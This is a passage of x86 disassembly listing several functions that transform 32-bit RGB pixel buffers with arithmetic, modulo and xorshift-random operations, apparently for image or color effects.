  403308:	66 0f d2 c6          	psrld  %xmm6,%xmm0
  40330c:	66 0f fe c1          	paddd  %xmm1,%xmm0
  403310:	66 0f d2 c7          	psrld  %xmm7,%xmm0
  403314:	66 0f 38 40 c5       	pmulld %xmm5,%xmm0
  403319:	66 0f fa d8          	psubd  %xmm0,%xmm3
  40331d:	66 0f 7e 5a e8       	movd   %xmm3,-0x18(%edx)
  403322:	66 0f 73 db 04       	psrldq $0x4,%xmm3
  403327:	66 0f 7e 5a ec       	movd   %xmm3,-0x14(%edx)
  40332c:	66 0f 73 db 04       	psrldq $0x4,%xmm3
  403331:	66 0f 7e 5a f0       	movd   %xmm3,-0x10(%edx)
  403336:	66 0f 73 db 04       	psrldq $0x4,%xmm3
  40333b:	66 0f 7e 5a f4       	movd   %xmm3,-0xc(%edx)
  403340:	3b cb                	cmp    %ebx,%ecx
  403342:	0f 8c f8 fe ff ff    	jl     0x403240
  403348:	3b ce                	cmp    %esi,%ecx
  40334a:	7d 16                	jge    0x403362
  40334c:	bb ff ff ff 00       	mov    $0xffffff,%ebx
  403351:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  403354:	33 d2                	xor    %edx,%edx
  403356:	03 c0                	add    %eax,%eax
  403358:	f7 f3                	div    %ebx
  40335a:	89 14 8f             	mov    %edx,(%edi,%ecx,4)
  40335d:	41                   	inc    %ecx
  40335e:	3b ce                	cmp    %esi,%ecx
  403360:	7c ef                	jl     0x403351
  403362:	5f                   	pop    %edi
  403363:	5b                   	pop    %ebx
  403364:	5e                   	pop    %esi
  403365:	5d                   	pop    %ebp
  403366:	c3                   	ret
  403367:	cc                   	int3
  403368:	cc                   	int3
  403369:	cc                   	int3
  40336a:	cc                   	int3
  40336b:	cc                   	int3
  40336c:	cc                   	int3
  40336d:	cc                   	int3
  40336e:	cc                   	int3
  40336f:	cc                   	int3
  403370:	55                   	push   %ebp
  403371:	8b ec                	mov    %esp,%ebp
  403373:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403376:	0f af 4d 10          	imul   0x10(%ebp),%ecx
  40337a:	56                   	push   %esi
  40337b:	33 f6                	xor    %esi,%esi
  40337d:	85 c9                	test   %ecx,%ecx
  40337f:	7e 79                	jle    0x4033fa
  403381:	53                   	push   %ebx
  403382:	57                   	push   %edi
  403383:	8b 7d 08             	mov    0x8(%ebp),%edi
  403386:	8d 04 bf             	lea    (%edi,%edi,4),%eax
  403389:	03 c0                	add    %eax,%eax
  40338b:	89 45 0c             	mov    %eax,0xc(%ebp)
  40338e:	66 90                	xchg   %ax,%ax
  403390:	8b 55 14             	mov    0x14(%ebp),%edx
  403393:	0f b6 1c b2          	movzbl (%edx,%esi,4),%ebx
  403397:	0f b6 44 b2 02       	movzbl 0x2(%edx,%esi,4),%eax
  40339c:	0f b6 54 b2 01       	movzbl 0x1(%edx,%esi,4),%edx
  4033a1:	03 c3                	add    %ebx,%eax
  4033a3:	03 d0                	add    %eax,%edx
  4033a5:	c1 ea 02             	shr    $0x2,%edx
  4033a8:	8d 04 32             	lea    (%edx,%esi,1),%eax
  4033ab:	25 ff 00 00 80       	and    $0x800000ff,%eax
  4033b0:	79 07                	jns    0x4033b9
  4033b2:	48                   	dec    %eax
  4033b3:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4033b8:	40                   	inc    %eax
  4033b9:	0f b6 c0             	movzbl %al,%eax
  4033bc:	03 d7                	add    %edi,%edx
  4033be:	c1 e0 08             	shl    $0x8,%eax
  4033c1:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
  4033c7:	79 08                	jns    0x4033d1
  4033c9:	4a                   	dec    %edx
  4033ca:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  4033d0:	42                   	inc    %edx
  4033d1:	0f b6 d2             	movzbl %dl,%edx
  4033d4:	80 c3 64             	add    $0x64,%bl
  4033d7:	0b c2                	or     %edx,%eax
  4033d9:	0f b6 d3             	movzbl %bl,%edx
  4033dc:	c1 e0 08             	shl    $0x8,%eax
  4033df:	bb ff ff ff 00       	mov    $0xffffff,%ebx
  4033e4:	0b c2                	or     %edx,%eax
  4033e6:	33 d2                	xor    %edx,%edx
  4033e8:	f7 f3                	div    %ebx
  4033ea:	8b 45 14             	mov    0x14(%ebp),%eax
  4033ed:	03 55 0c             	add    0xc(%ebp),%edx
  4033f0:	89 14 b0             	mov    %edx,(%eax,%esi,4)
  4033f3:	46                   	inc    %esi
  4033f4:	3b f1                	cmp    %ecx,%esi
  4033f6:	7c 98                	jl     0x403390
  4033f8:	5f                   	pop    %edi
  4033f9:	5b                   	pop    %ebx
  4033fa:	5e                   	pop    %esi
  4033fb:	5d                   	pop    %ebp
  4033fc:	c3                   	ret
  4033fd:	cc                   	int3
  4033fe:	cc                   	int3
  4033ff:	cc                   	int3
  403400:	55                   	push   %ebp
  403401:	8b ec                	mov    %esp,%ebp
  403403:	83 e4 f8             	and    $0xfffffff8,%esp
  403406:	51                   	push   %ecx
  403407:	53                   	push   %ebx
  403408:	56                   	push   %esi
  403409:	57                   	push   %edi
  40340a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40340d:	33 f6                	xor    %esi,%esi
  40340f:	0f af 7d 10          	imul   0x10(%ebp),%edi
  403413:	89 74 24 0c          	mov    %esi,0xc(%esp)
  403417:	85 ff                	test   %edi,%edi
  403419:	0f 8e a6 00 00 00    	jle    0x4034c5
  40341f:	8b 45 14             	mov    0x14(%ebp),%eax
  403422:	0f b6 1c b0          	movzbl (%eax,%esi,4),%ebx
  403426:	8b 45 08             	mov    0x8(%ebp),%eax
  403429:	99                   	cltd
  40342a:	8d 4b 01             	lea    0x1(%ebx),%ecx
  40342d:	f7 f9                	idiv   %ecx
  40342f:	8b d6                	mov    %esi,%edx
  403431:	8b c8                	mov    %eax,%ecx
  403433:	d3 fa                	sar    %cl,%edx
  403435:	66 0f 6e c2          	movd   %edx,%xmm0
  403439:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  40343d:	e8 ae bd 00 00       	call   0x40f1f0
  403442:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  403446:	b8 67 66 66 66       	mov    $0x66666667,%eax
  40344b:	f7 e9                	imul   %ecx
  40344d:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403451:	8b 45 14             	mov    0x14(%ebp),%eax
  403454:	c1 fa 02             	sar    $0x2,%edx
  403457:	8b f2                	mov    %edx,%esi
  403459:	c1 ee 1f             	shr    $0x1f,%esi
  40345c:	0f b6 44 88 01       	movzbl 0x1(%eax,%ecx,4),%eax
  403461:	03 f2                	add    %edx,%esi
  403463:	03 c1                	add    %ecx,%eax
  403465:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40346a:	79 07                	jns    0x403473
  40346c:	48                   	dec    %eax
  40346d:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  403472:	40                   	inc    %eax
  403473:	0f b6 d0             	movzbl %al,%edx
  403476:	8b 45 14             	mov    0x14(%ebp),%eax
  403479:	c1 e2 08             	shl    $0x8,%edx
  40347c:	0f b6 4c 88 02       	movzbl 0x2(%eax,%ecx,4),%ecx
  403481:	03 4d 08             	add    0x8(%ebp),%ecx
  403484:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
  40348a:	79 08                	jns    0x403494
  40348c:	49                   	dec    %ecx
  40348d:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  403493:	41                   	inc    %ecx
  403494:	0f b6 c1             	movzbl %cl,%eax
  403497:	02 db                	add    %bl,%bl
  403499:	0b c2                	or     %edx,%eax
  40349b:	0f b6 cb             	movzbl %bl,%ecx
  40349e:	c1 e0 08             	shl    $0x8,%eax
  4034a1:	33 d2                	xor    %edx,%edx
  4034a3:	0b c1                	or     %ecx,%eax
  4034a5:	b9 ff ff ff 00       	mov    $0xffffff,%ecx
  4034aa:	03 c6                	add    %esi,%eax
  4034ac:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4034b0:	f7 f1                	div    %ecx
  4034b2:	8b 45 14             	mov    0x14(%ebp),%eax
  4034b5:	89 14 b0             	mov    %edx,(%eax,%esi,4)
  4034b8:	46                   	inc    %esi
  4034b9:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4034bd:	3b f7                	cmp    %edi,%esi
  4034bf:	0f 8c 5d ff ff ff    	jl     0x403422
  4034c5:	5f                   	pop    %edi
  4034c6:	5e                   	pop    %esi
  4034c7:	5b                   	pop    %ebx
  4034c8:	8b e5                	mov    %ebp,%esp
  4034ca:	5d                   	pop    %ebp
  4034cb:	c3                   	ret
  4034cc:	cc                   	int3
  4034cd:	cc                   	int3
  4034ce:	cc                   	int3
  4034cf:	cc                   	int3
  4034d0:	55                   	push   %ebp
  4034d1:	8b ec                	mov    %esp,%ebp
  4034d3:	83 e4 f8             	and    $0xfffffff8,%esp
  4034d6:	51                   	push   %ecx
  4034d7:	53                   	push   %ebx
  4034d8:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4034db:	0f af 5d 10          	imul   0x10(%ebp),%ebx
  4034df:	56                   	push   %esi
  4034e0:	57                   	push   %edi
  4034e1:	33 ff                	xor    %edi,%edi
  4034e3:	85 db                	test   %ebx,%ebx
  4034e5:	7e 60                	jle    0x403547
  4034e7:	8b 45 14             	mov    0x14(%ebp),%eax
  4034ea:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  4034f0:	0f b7 0c b8          	movzwl (%eax,%edi,4),%ecx
  4034f4:	0f b6 54 b8 02       	movzbl 0x2(%eax,%edi,4),%edx
  4034f9:	8b c1                	mov    %ecx,%eax
  4034fb:	c1 e8 08             	shr    $0x8,%eax
  4034fe:	03 d0                	add    %eax,%edx
  403500:	66 0f 6e c7          	movd   %edi,%xmm0
  403504:	0f b6 c1             	movzbl %cl,%eax
  403507:	03 d0                	add    %eax,%edx
  403509:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  40350e:	f7 e2                	mul    %edx
  403510:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  403514:	d1 ea                	shr    $1,%edx
  403516:	0f b6 f2             	movzbl %dl,%esi
  403519:	e8 d2 bc 00 00       	call   0x40f1f0
  40351e:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  403522:	8b c6                	mov    %esi,%eax
  403524:	33 d2                	xor    %edx,%edx
  403526:	c1 e0 08             	shl    $0x8,%eax
  403529:	0b c6                	or     %esi,%eax
  40352b:	c1 e0 08             	shl    $0x8,%eax
  40352e:	0b c6                	or     %esi,%eax
  403530:	2b c1                	sub    %ecx,%eax
  403532:	b9 ff ff ff 00       	mov    $0xffffff,%ecx
  403537:	03 45 08             	add    0x8(%ebp),%eax
  40353a:	f7 f1                	div    %ecx
  40353c:	8b 45 14             	mov    0x14(%ebp),%eax
  40353f:	89 14 b8             	mov    %edx,(%eax,%edi,4)
  403542:	47                   	inc    %edi
  403543:	3b fb                	cmp    %ebx,%edi
  403545:	7c a9                	jl     0x4034f0
  403547:	5f                   	pop    %edi
  403548:	5e                   	pop    %esi
  403549:	5b                   	pop    %ebx
  40354a:	8b e5                	mov    %ebp,%esp
  40354c:	5d                   	pop    %ebp
  40354d:	c3                   	ret
  40354e:	cc                   	int3
  40354f:	cc                   	int3
  403550:	55                   	push   %ebp
  403551:	8b ec                	mov    %esp,%ebp
  403553:	83 e4 f8             	and    $0xfffffff8,%esp
  403556:	51                   	push   %ecx
  403557:	53                   	push   %ebx
  403558:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40355b:	33 d2                	xor    %edx,%edx
  40355d:	0f af 5d 10          	imul   0x10(%ebp),%ebx
  403561:	56                   	push   %esi
  403562:	57                   	push   %edi
  403563:	89 54 24 0c          	mov    %edx,0xc(%esp)
  403567:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  40356a:	85 db                	test   %ebx,%ebx
  40356c:	7e 61                	jle    0x4035cf
  40356e:	8b 3d f4 81 41 00    	mov    0x4181f4,%edi
  403574:	8b c7                	mov    %edi,%eax
  403576:	8d 72 01             	lea    0x1(%edx),%esi
  403579:	c1 e0 0d             	shl    $0xd,%eax
  40357c:	33 c7                	xor    %edi,%eax
  40357e:	66 0f 6e c6          	movd   %esi,%xmm0
  403582:	8b c8                	mov    %eax,%ecx
  403584:	c1 e9 11             	shr    $0x11,%ecx
  403587:	33 c8                	xor    %eax,%ecx
  403589:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  40358d:	8b f9                	mov    %ecx,%edi
  40358f:	c1 e7 05             	shl    $0x5,%edi
  403592:	33 f9                	xor    %ecx,%edi
  403594:	e8 57 bc 00 00       	call   0x40f1f0
  403599:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  40359d:	33 d2                	xor    %edx,%edx
  40359f:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4035a2:	8b c7                	mov    %edi,%eax
  4035a4:	f7 f1                	div    %ecx
  4035a6:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4035aa:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
  4035ad:	bb ff ff ff 00       	mov    $0xffffff,%ebx
  4035b2:	2b c2                	sub    %edx,%eax
  4035b4:	33 d2                	xor    %edx,%edx
  4035b6:	f7 f3                	div    %ebx
  4035b8:	8b 45 14             	mov    0x14(%ebp),%eax
  4035bb:	89 14 88             	mov    %edx,(%eax,%ecx,4)
  4035be:	8b d6                	mov    %esi,%edx
  4035c0:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4035c4:	3b 55 0c             	cmp    0xc(%ebp),%edx
  4035c7:	7c ab                	jl     0x403574
  4035c9:	89 3d f4 81 41 00    	mov    %edi,0x4181f4
  4035cf:	5f                   	pop    %edi
  4035d0:	5e                   	pop    %esi
  4035d1:	5b                   	pop    %ebx
  4035d2:	8b e5                	mov    %ebp,%esp
  4035d4:	5d                   	pop    %ebp
  4035d5:	c3                   	ret
  4035d6:	cc                   	int3
  4035d7:	cc                   	int3
  4035d8:	cc                   	int3
  4035d9:	cc                   	int3
  4035da:	cc                   	int3
  4035db:	cc                   	int3
  4035dc:	cc                   	int3
  4035dd:	cc                   	int3
  4035de:	cc                   	int3
  4035df:	cc                   	int3
  4035e0:	55                   	push   %ebp
  4035e1:	8b ec                	mov    %esp,%ebp
  4035e3:	57                   	push   %edi
  4035e4:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4035e7:	33 c9                	xor    %ecx,%ecx
  4035e9:	0f af 7d 10          	imul   0x10(%ebp),%edi
  4035ed:	85 ff                	test   %edi,%edi
  4035ef:	7e 21                	jle    0x403612
  4035f1:	53                   	push   %ebx
  4035f2:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4035f5:	56                   	push   %esi
  4035f6:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
  4035f9:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  4035fe:	f7 e1                	mul    %ecx
  403600:	d1 ea                	shr    $1,%edx
  403602:	8b 04 93             	mov    (%ebx,%edx,4),%eax
  403605:	89 04 8b             	mov    %eax,(%ebx,%ecx,4)
  403608:	41                   	inc    %ecx
  403609:	89 34 93             	mov    %esi,(%ebx,%edx,4)
  40360c:	3b cf                	cmp    %edi,%ecx
  40360e:	7c e6                	jl     0x4035f6
  403610:	5e                   	pop    %esi
  403611:	5b                   	pop    %ebx
  403612:	5f                   	pop    %edi
  403613:	5d                   	pop    %ebp
  403614:	c3                   	ret
  403615:	cc                   	int3
  403616:	cc                   	int3
  403617:	cc                   	int3
  403618:	cc                   	int3
  403619:	cc                   	int3
  40361a:	cc                   	int3
  40361b:	cc                   	int3
  40361c:	cc                   	int3
  40361d:	cc                   	int3
  40361e:	cc                   	int3
  40361f:	cc                   	int3
  403620:	55                   	push   %ebp
  403621:	8b ec                	mov    %esp,%ebp
  403623:	51                   	push   %ecx
  403624:	53                   	push   %ebx
  403625:	56                   	push   %esi
  403626:	8b 75 0c             	mov    0xc(%ebp),%esi
  403629:	33 db                	xor    %ebx,%ebx
  40362b:	57                   	push   %edi
  40362c:	8b fe                	mov    %esi,%edi
  40362e:	0f af 7d 10          	imul   0x10(%ebp),%edi
  403632:	89 5d 10             	mov    %ebx,0x10(%ebp)
  403635:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403638:	85 ff                	test   %edi,%edi
  40363a:	7e 6a                	jle    0x4036a6
  40363c:	8b 0d f4 81 41 00    	mov    0x4181f4,%ecx
  403642:	8b c1                	mov    %ecx,%eax
  403644:	8b 7d 14             	mov    0x14(%ebp),%edi
  403647:	c1 e0 0d             	shl    $0xd,%eax
  40364a:	33 c1                	xor    %ecx,%eax
  40364c:	8b d0                	mov    %eax,%edx
  40364e:	c1 ea 11             	shr    $0x11,%edx
  403651:	33 d0                	xor    %eax,%edx
  403653:	8b ca                	mov    %edx,%ecx
  403655:	c1 e1 05             	shl    $0x5,%ecx
  403658:	33 ca                	xor    %edx,%ecx
  40365a:	33 d2                	xor    %edx,%edx
  40365c:	8b c1                	mov    %ecx,%eax
  40365e:	f7 f6                	div    %esi
  403660:	8b 45 14             	mov    0x14(%ebp),%eax
  403663:	8d 34 90             	lea    (%eax,%edx,4),%esi
  403666:	8a 5c 98 02          	mov    0x2(%eax,%ebx,4),%bl
  40366a:	0f b6 46 02          	movzbl 0x2(%esi),%eax
  40366e:	8b d0                	mov    %eax,%edx
  403670:	c1 e2 08             	shl    $0x8,%edx
  403673:	0b d0                	or     %eax,%edx
  403675:	c1 e2 08             	shl    $0x8,%edx
  403678:	0b d0                	or     %eax,%edx
  40367a:	8b 45 10             	mov    0x10(%ebp),%eax
  40367d:	89 14 87             	mov    %edx,(%edi,%eax,4)
  403680:	0f b6 c3             	movzbl %bl,%eax
  403683:	8b 5d 10             	mov    0x10(%ebp),%ebx
  403686:	8b d0                	mov    %eax,%edx
  403688:	c1 e2 08             	shl    $0x8,%edx
  40368b:	43                   	inc    %ebx
  40368c:	0b d0                	or     %eax,%edx
  40368e:	89 5d 10             	mov    %ebx,0x10(%ebp)
  403691:	c1 e2 08             	shl    $0x8,%edx
  403694:	0b d0                	or     %eax,%edx
  403696:	89 16                	mov    %edx,(%esi)
  403698:	8b 75 0c             	mov    0xc(%ebp),%esi
  40369b:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  40369e:	7c a2                	jl     0x403642
  4036a0:	89 0d f4 81 41 00    	mov    %ecx,0x4181f4
  4036a6:	5f                   	pop    %edi
  4036a7:	5e                   	pop    %esi
  4036a8:	5b                   	pop    %ebx
  4036a9:	8b e5                	mov    %ebp,%esp
  4036ab:	5d                   	pop    %ebp
  4036ac:	c3                   	ret
  4036ad:	cc                   	int3
  4036ae:	cc                   	int3
  4036af:	cc                   	int3
  4036b0:	55                   	push   %ebp
  4036b1:	8b ec                	mov    %esp,%ebp
  4036b3:	51                   	push   %ecx
  4036b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4036b7:	53                   	push   %ebx
  4036b8:	33 db                	xor    %ebx,%ebx
  4036ba:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  4036bd:	03 c9                	add    %ecx,%ecx
  4036bf:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4036c2:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4036c5:	7e 4e                	jle    0x403715
  4036c7:	56                   	push   %esi
  4036c8:	57                   	push   %edi
  4036c9:	8b 7d 10             	mov    0x10(%ebp),%edi
  4036cc:	0f 1f 40 00          	nopl   0x0(%eax)
  4036d0:	33 c0                	xor    %eax,%eax
  4036d2:	85 ff                	test   %edi,%edi
  4036d4:	7e 37                	jle    0x40370d
  4036d6:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
  4036dc:	79 08                	jns    0x4036e6
  4036de:	49                   	dec    %ecx
  4036df:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  4036e5:	41                   	inc    %ecx
  4036e6:	8b 55 14             	mov    0x14(%ebp),%edx
  4036e9:	0f b6 f1             	movzbl %cl,%esi
  4036ec:	0f b6 cb             	movzbl %bl,%ecx
  4036ef:	c1 e6 08             	shl    $0x8,%esi
  4036f2:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4036f5:	0f b6 c8             	movzbl %al,%ecx
  4036f8:	40                   	inc    %eax
  4036f9:	0b ce                	or     %esi,%ecx
  4036fb:	c1 e1 08             	shl    $0x8,%ecx
  4036fe:	0b 4d 08             	or     0x8(%ebp),%ecx
  403701:	89 0a                	mov    %ecx,(%edx)
  403703:	8d 14 9a             	lea    (%edx,%ebx,4),%edx
  403706:	3b c7                	cmp    %edi,%eax
  403708:	7c eb                	jl     0x4036f5
  40370a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40370d:	43                   	inc    %ebx
  40370e:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  403711:	7c bd                	jl     0x4036d0
  403713:	5f                   	pop    %edi
  403714:	5e                   	pop    %esi
  403715:	5b                   	pop    %ebx
  403716:	8b e5                	mov    %ebp,%esp
  403718:	5d                   	pop    %ebp
  403719:	c3                   	ret
  40371a:	cc                   	int3
  40371b:	cc                   	int3
  40371c:	cc                   	int3
  40371d:	cc                   	int3
  40371e:	cc                   	int3
  40371f:	cc                   	int3
  403720:	55                   	push   %ebp
  403721:	8b ec                	mov    %esp,%ebp
  403723:	83 ec 0c             	sub    $0xc,%esp
  403726:	6b 45 08 32          	imul   $0x32,0x8(%ebp),%eax
  40372a:	57                   	push   %edi
  40372b:	33 ff                	xor    %edi,%edi
  40372d:	89 7d 08             	mov    %edi,0x8(%ebp)
  403730:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403733:	39 7d 10             	cmp    %edi,0x10(%ebp)
  403736:	0f 8e bd 00 00 00    	jle    0x4037f9
  40373c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40373f:	53                   	push   %ebx
  403740:	56                   	push   %esi
  403741:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  403748:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40374b:	8d 14 8d 00 00 00 00 	lea    0x0(,%ecx,4),%edx
  403752:	8b 45 14             	mov    0x14(%ebp),%eax
  403755:	33 f6                	xor    %esi,%esi
  403757:	85 c9                	test   %ecx,%ecx
  403759:	0f 8e 86 00 00 00    	jle    0x4037e5
  40375f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403762:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  403767:	f7 e7                	mul    %edi
  403769:	8b c2                	mov    %edx,%eax
  40376b:	c1 e8 03             	shr    $0x3,%eax
  40376e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403771:	8b f8                	mov    %eax,%edi
  403773:	0f b6 59 01          	movzbl 0x1(%ecx),%ebx
  403777:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  40377c:	f7 e6                	mul    %esi
  40377e:	c1 ea 03             	shr    $0x3,%edx
  403781:	03 da                	add    %edx,%ebx
  403783:	81 e3 ff 00 00 80    	and    $0x800000ff,%ebx
  403789:	79 08                	jns    0x403793
  40378b:	4b                   	dec    %ebx
  40378c:	81 cb 00 ff ff ff    	or     $0xffffff00,%ebx
  403792:	43                   	inc    %ebx
  403793:	0f b6 01             	movzbl (%ecx),%eax
  403796:	03 45 f8             	add    -0x8(%ebp),%eax
  403799:	0f b6 d3             	movzbl %bl,%edx
  40379c:	25 ff 00 00 80       	and    $0x800000ff,%eax
  4037a1:	79 07                	jns    0x4037aa
  4037a3:	48                   	dec    %eax
  4037a4:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4037a9:	40                   	inc    %eax
  4037aa:	0f b6 c0             	movzbl %al,%eax
  4037ad:	c1 e0 08             	shl    $0x8,%eax
  4037b0:	0b d0                	or     %eax,%edx
  4037b2:	0f b6 41 02          	movzbl 0x2(%ecx),%eax
  4037b6:	03 c7                	add    %edi,%eax
  4037b8:	c1 e2 08             	shl    $0x8,%edx
  4037bb:	25 ff 00 00 80       	and    $0x800000ff,%eax
  4037c0:	79 07                	jns    0x4037c9
  4037c2:	48                   	dec    %eax
  4037c3:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4037c8:	40                   	inc    %eax
  4037c9:	0f b6 c0             	movzbl %al,%eax
  4037cc:	46                   	inc    %esi
  4037cd:	0b d0                	or     %eax,%edx
  4037cf:	89 11                	mov    %edx,(%ecx)
  4037d1:	83 c1 04             	add    $0x4,%ecx
  4037d4:	3b 75 0c             	cmp    0xc(%ebp),%esi
  4037d7:	7c 9a                	jl     0x403773
  4037d9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4037dc:	8b 45 14             	mov    0x14(%ebp),%eax
  4037df:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4037e2:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4037e5:	47                   	inc    %edi
  4037e6:	03 c2                	add    %edx,%eax
  4037e8:	89 7d 08             	mov    %edi,0x8(%ebp)
  4037eb:	89 45 14             	mov    %eax,0x14(%ebp)
  4037ee:	3b 7d 10             	cmp    0x10(%ebp),%edi
  4037f1:	0f 8c 5e ff ff ff    	jl     0x403755
  4037f7:	5e                   	pop    %esi
  4037f8:	5b                   	pop    %ebx
  4037f9:	5f                   	pop    %edi
  4037fa:	8b e5                	mov    %ebp,%esp
  4037fc:	5d                   	pop    %ebp
  4037fd:	c3                   	ret
  4037fe:	cc                   	int3
  4037ff:	cc                   	int3
  403800:	55                   	push   %ebp
  403801:	8b ec                	mov    %esp,%ebp
  403803:	83 ec 0c             	sub    $0xc,%esp
  403806:	53                   	push   %ebx
  403807:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40380a:	33 c9                	xor    %ecx,%ecx
  40380c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40380f:	85 db                	test   %ebx,%ebx
  403811:	0f 8e e2 00 00 00    	jle    0x4038f9
  403817:	8b 45 0c             	mov    0xc(%ebp),%eax
  40381a:	8b d0                	mov    %eax,%edx
  40381c:	0f af d3             	imul   %ebx,%edx
  40381f:	56                   	push   %esi
  403820:	8b 35 f4 81 41 00    	mov    0x4181f4,%esi
  403826:	57                   	push   %edi
  403827:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40382a:	8b 55 14             	mov    0x14(%ebp),%edx
  40382d:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403830:	33 ff                	xor    %edi,%edi
  403832:	85 c0                	test   %eax,%eax
  403834:	0f 8e a5 00 00 00    	jle    0x4038df
  40383a:	8b da                	mov    %edx,%ebx
  40383c:	0f 1f 40 00          	nopl   0x0(%eax)
  403840:	8b c6                	mov    %esi,%eax
  403842:	c1 e0 0d             	shl    $0xd,%eax
  403845:	33 c6                	xor    %esi,%eax
  403847:	8b c8                	mov    %eax,%ecx
  403849:	c1 e9 11             	shr    $0x11,%ecx
  40384c:	33 c8                	xor    %eax,%ecx
  40384e:	b8 a3 8b 2e ba       	mov    $0xba2e8ba3,%eax
  403853:	8b f1                	mov    %ecx,%esi
  403855:	c1 e6 05             	shl    $0x5,%esi
  403858:	33 f1                	xor    %ecx,%esi
  40385a:	f7 e6                	mul    %esi
  40385c:	8b ce                	mov    %esi,%ecx
  40385e:	c1 ea 03             	shr    $0x3,%edx
  403861:	6b c2 0b             	imul   $0xb,%edx,%eax
  403864:	2b c8                	sub    %eax,%ecx
  403866:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403869:	03 c1                	add    %ecx,%eax
  40386b:	8d 48 fb             	lea    -0x5(%eax),%ecx
  40386e:	85 c9                	test   %ecx,%ecx
  403870:	79 07                	jns    0x403879
  403872:	b9 05 00 00 00       	mov    $0x5,%ecx
  403877:	2b c8                	sub    %eax,%ecx
  403879:	8b c6                	mov    %esi,%eax
  40387b:	c1 e0 0d             	shl    $0xd,%eax
  40387e:	33 c6                	xor    %esi,%eax
  403880:	8b d0                	mov    %eax,%edx
  403882:	c1 ea 11             	shr    $0x11,%edx
  403885:	33 d0                	xor    %eax,%edx
  403887:	b8 a3 8b 2e ba       	mov    $0xba2e8ba3,%eax
  40388c:	8b f2                	mov    %edx,%esi
  40388e:	c1 e6 05             	shl    $0x5,%esi
  403891:	33 f2                	xor    %edx,%esi
  403893:	f7 e6                	mul    %esi
  403895:	c1 ea 03             	shr    $0x3,%edx
  403898:	6b c2 0b             	imul   $0xb,%edx,%eax
  40389b:	8b d6                	mov    %esi,%edx
  40389d:	2b d0                	sub    %eax,%edx
  40389f:	03 d7                	add    %edi,%edx
  4038a1:	8d 42 fb             	lea    -0x5(%edx),%eax
  4038a4:	85 c0                	test   %eax,%eax
  4038a6:	79 07                	jns    0x4038af
  4038a8:	b8 05 00 00 00       	mov    $0x5,%eax
  4038ad:	2b c2                	sub    %edx,%eax
  4038af:	0f af 4d 0c          	imul   0xc(%ebp),%ecx
  4038b3:	47                   	inc    %edi
  4038b4:	03 c1                	add    %ecx,%eax
  4038b6:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4038b9:	99                   	cltd
  4038ba:	f7 7d f4             	idivl  -0xc(%ebp)
  4038bd:	8b 04 91             	mov    (%ecx,%edx,4),%eax
  4038c0:	89 03                	mov    %eax,(%ebx)
  4038c2:	83 c3 04             	add    $0x4,%ebx
  4038c5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4038c8:	3b f8                	cmp    %eax,%edi
  4038ca:	0f 8c 70 ff ff ff    	jl     0x403840
  4038d0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4038d3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4038d6:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4038d9:	89 35 f4 81 41 00    	mov    %esi,0x4181f4
  4038df:	41                   	inc    %ecx
